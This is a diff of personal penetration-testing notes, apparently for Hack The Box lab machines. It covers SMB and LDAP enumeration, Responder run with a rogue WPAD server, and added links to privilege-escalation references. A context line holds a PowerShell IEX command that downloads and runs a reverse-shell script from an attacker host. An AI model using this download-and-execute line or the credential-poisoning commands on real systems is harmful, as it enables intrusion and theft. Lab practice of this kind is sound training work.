@@ -12,11 +12,12 @@ smbclient -N -L //10.10.10.161/
 smbclient -N //10.10.10.161/Share
 smbmap -H 10.10.10.161 -u anonymous -d HTB.LOCAL
 smbmap -H 10.10.10.161 -u anonymous -d localhost
+https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html?fbclid=IwAR1qQDsLzkudInhrnUwL1V9ONiVXMD-vW1V5hrEI92xmuhlExEFOmyu_3xc#check-null-sessions
 
 # LDAP
 ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb" 
 
-responder.oy -i eth0 -w -f
+responder.py -I eth0 -w -f
 
 -w : WPAD rogue server
 -f : This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.
@@ -66,5 +67,8 @@ Windows Site:
 
 - C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')
 
+# Privilige Escalation
+https://guif.re/windowseop?fbclid=IwAR2fwsD6D7XjFhZbD4IGSTHtQkGs5D7HXEwVEnCYSQEDWzsuqds8geOi7uc#EoP%208:%20Kernel%20vulnerabilities
 
+https://www.scip.ch/en/?labs.20181011
 
